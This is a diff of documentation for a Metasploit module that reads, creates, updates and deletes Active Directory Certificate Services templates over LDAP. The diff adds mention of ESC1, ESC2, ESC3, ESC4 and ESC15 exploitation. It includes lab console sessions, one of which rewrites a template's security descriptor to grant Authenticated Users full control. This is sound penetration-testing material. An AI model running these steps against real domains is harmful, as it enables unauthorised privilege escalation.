@@ -1,9 +1,13 @@
-## RBCD Exploitation
+## AD CS Certificate Template Exploitation
 
 This module can read, write, update, and delete AD CS certificate templates from a Active Directory Domain Controller.
 
-The READ, UPDATE, and DELETE actions will write a copy of the certificate template to disk that can be restored using
-the CREATE or UPDATE actions.
+The READ, UPDATE, and DELETE actions will write a copy of the certificate template to disk that can be
+restored using the CREATE or UPDATE actions. The CREATE and UPDATE actions require a certificate template data
+file to be specified to define the attributes. Template data files are provided to create a template that is
+vulnerable to ESC1, ESC2, ESC3 and ESC15.
+
+This module is capable of exploiting ESC4.
 
 In order for the `auxiliary/admin/ldap/ad_cs_cert_template` module to succeed, the authenticated user must have the 
 necessary permissions to perform the specified action on the target object (the certificate specified in
@@ -15,7 +19,7 @@ Follow the steps in the [[Installing AD CS|ad-certificates/overview.md#installin
 
 ## Module usage
 
-The `admin/ldap/ad_cs_template` module is generally used to update a certificate template as part of an ESC4 attack.
+The `admin/ldap/ad_cs_cert_template` module is generally used to update a certificate template as part of an ESC4 attack.
 
 1. From msfconsole
 2. Do: `use auxiliary/admin/ldap/ad_cs_cert_template`
@@ -56,11 +60,11 @@ The file format is determined by the extension so the file must end in either `.
 
 #### The JSON format
 The JSON file format is a hash with attribute name keys and ASCII-hex encoded values. These files are compatible with
-[`Certipy`'s][certipy] `template` command. This module uses the JSON file format when storing copies fo certificate to
+[`Certipy`'s][certipy] `template` command. This module uses the JSON file format when storing copies of certificate to
 disk.
 
 #### The YAML format
-The YAML file format is similiar to the JSON file format, but takes advantage of YAML's ability to include comments.
+The YAML file format is similar to the JSON file format, but takes advantage of YAML's ability to include comments.
 The file consists of a hash with attribute name keys and value strings. The `nTSecurityDescriptor` file can be either
 a binary string representing a literal value, or a security descriptor defined in Microsoft's [Security Descriptor
 Definition Language (SDDL)][sddl]. Premade configuration templates provided by Metasploit use this format.
@@ -76,20 +80,20 @@ can be used to make one vulnerable to ESC1, or a previously saved configuration 
 the `TEMPLATE_FILE` option is used to restore the settings from a previously deleted template.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
+msf auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
 USERNAME => aliddle
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
 PASSWORD => Password1!
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
 CERT_TEMPLATE => ESC4-Test
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION CREATE
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION CREATE
 ACTION => CREATE
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set TEMPLATE_FILE /home/smcintyre/.msf4/loot/20230505102851_default_192.168.159.10_windows.ad.cs.te_242316.json
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set TEMPLATE_FILE /home/smcintyre/.msf4/loot/20230505102851_default_192.168.159.10_windows.ad.cs.te_242316.json
 TEMPLATE_FILE => /home/smcintyre/.msf4/loot/20230505102851_default_192.168.159.10_windows.ad.cs.te_242316.json
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Running module against 192.168.159.10
 
 [+] Successfully bound to the LDAP server!
@@ -99,7 +103,7 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Creating: CN=ESC4-Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=msflab,DC=local
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > 
 ```
 
 ### Deleting A Certificate Template
@@ -109,18 +113,18 @@ certificate's data is made before it is deleted. This file can be used with the 
 certificate template.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
+msf auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
 USERNAME => aliddle
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
 PASSWORD => Password1!
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
 CERT_TEMPLATE => ESC4-Test
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION DELETE 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION DELETE 
 ACTION => DELETE
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Running module against 192.168.159.10
 
 [+] Successfully bound to the LDAP server!
@@ -131,7 +135,7 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Certificate template data written to: /home/smcintyre/.msf4/loot/20230505102851_default_192.168.159.10_windows.ad.cs.te_242316.json
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) >
+msf auxiliary(admin/ldap/ad_cs_cert_template) >
 ```
 
 ### Reading A Certificate Template
@@ -139,18 +143,18 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) >
 In this scenario, the operator uses the module to read the configuration of the default `User` certificate template.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
+msf auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
 USERNAME => aliddle
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
 PASSWORD => Password1!
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE User
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION READ
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION READ
 ACTION => READ
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Running module against 192.168.159.10
 
 [+] Successfully bound to the LDAP server!
@@ -179,7 +183,7 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*]     * 1.3.6.1.5.5.7.3.2
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > 
 ```
 
 ### Updating A Certificate Template
@@ -189,20 +193,20 @@ vulnerable to ESC1 (the default template settings). This process first makes a b
 be used later. The local certificate template data can be modified to set a custom security descriptor.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
+msf auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME aliddle
 USERNAME => aliddle
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD Password1!
 PASSWORD => Password1!
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
 CERT_TEMPLATE => ESC4-Test
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION UPDATE 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION UPDATE 
 ACTION => UPDATE
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set VERBOSE true 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set VERBOSE true 
 VERBOSE => true
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Running module against 192.168.159.10
 
 [+] Successfully bound to the LDAP server!
@@ -214,7 +218,7 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Parsing SDDL text: D:PAI(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AU)
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > 
 ```
 
 [certipy]: https://github.com/ly4k/Certipy
